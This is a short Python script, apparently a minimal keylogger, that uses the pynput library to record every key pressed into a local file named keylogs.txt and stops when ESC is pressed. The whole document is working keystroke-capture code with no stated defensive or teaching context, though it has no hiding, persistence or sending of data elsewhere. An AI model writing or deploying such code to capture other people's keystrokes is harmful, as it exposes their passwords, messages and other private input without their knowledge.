from pynput import keyboard

log_file = "keylogs.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop the keylogger when ESC is pressed

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
